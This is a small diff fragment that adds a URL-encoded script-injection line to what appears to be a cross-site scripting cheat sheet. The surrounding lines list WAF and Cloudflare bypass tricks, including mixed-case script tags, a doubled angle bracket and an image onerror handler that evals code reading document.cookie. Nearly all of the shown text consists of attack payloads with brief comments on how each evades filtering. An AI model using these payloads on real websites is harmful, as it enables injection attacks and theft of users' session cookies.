@@ -23,6 +23,7 @@ cloud flare bypass
 6. Try capitalizing the alert function
 </textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
 
+"%2F><%2Fscript><script>alert(%27Vulnerable%27)<%2Fscript>
 XSS WAF BYPASS
 <sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
 <<script>alert(XSS)</script> #prepending an additional "<"
